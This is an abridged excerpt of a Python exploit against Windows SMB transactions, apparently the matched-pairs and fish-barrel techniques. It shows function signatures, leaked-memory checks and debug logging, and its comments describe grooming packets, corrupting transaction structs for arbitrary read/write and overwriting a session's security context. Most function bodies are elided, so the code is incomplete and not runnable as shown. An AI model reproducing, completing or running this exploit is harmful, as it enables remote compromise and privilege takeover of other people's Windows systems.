...
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
    ...
    if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
        logger.log.debug('No transaction struct in leak data')
        return None
    ...
    logger.log.debug('InParam: 0x{:x}'.format(inparam_value))
    logger.log.debug('MID: 0x{:x}'.format(leak_mid))
...
def exploit_matched_pairs(conn, pipe_name, info):
    ...
    logger.log.debug('success controlling groom transaction')
...
def exploit_fish_barrel(conn, pipe_name, info):
    ...
    logger.log.debug('Groom packets')
    ...
    for tinfo in attempt_list:
        ...
        if recvPkt.getNTStatus() == 0x10002:  # invalid SMB
            ...
            success = True
            if 'arch' not in info:
                logger.log.debug('Target is '+tinfo['ARCH'])
    ...
    if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
        logger.log.debug('chunk size is wrong')
        return False
    ...
    # ================================
    logger.log.debug('modify transaction struct for arbitrary read/write')
    # modify
    # - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
    # - trans1.InData to &trans2. so we can modify trans2 with trans1 data
...
def exploit(target, user, pwd, pipe_name=None):
    ...
    conn.login(user, pwd, maxBufferSize=4356)
    server_os = conn.get_server_os()
    logger.log.info(str(target) + ': Target OS: '+server_os)
    ...
    if pipe_name is None:
        ...
        if pipe_name is None:
            logger.log.debug(str(target) + ' Not found accessible named pipe')
            return False
        logger.log.debug(str(target) + ' Using named pipe: '+pipe_name)
    ...
    if 'PCTXTHANDLE_TOKEN_OFFSET' in info:
        ...
        logger.log.debug('overwriting session security context')
...
def get_group_data_from_token(info, tokenData):
    ...
    if not success:
        logger.log.debug('Bad TOKEN_USER_GROUP offsets. Abort > BSOD')
        sys.exit()
